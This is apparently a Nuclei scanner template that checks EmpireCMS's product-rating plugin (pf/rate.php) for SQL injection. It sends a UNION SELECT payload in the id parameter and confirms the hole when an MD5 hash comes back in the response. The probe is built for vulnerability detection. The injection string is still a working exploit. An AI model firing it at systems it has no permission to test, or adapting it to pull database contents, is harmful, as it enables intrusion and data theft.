id: EmpireCMS-rate-sqli

info:
  name: 帝国CMS(EmpireCMS)商品评分插件 rate.php SQL注入
  author: str1am
  severity: high
  tags: EmpireCMS,sqli

requests:
  - method: GET
    path:
      - "{{BaseURL}}/pf/rate.php?id=-1+UNION+ALL+SELECT+NULL,CONCAT(0x23,md5(123),0x23)--+-"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "202cb962ac59075b964b07152d234b70"
        part: body
        condition: and
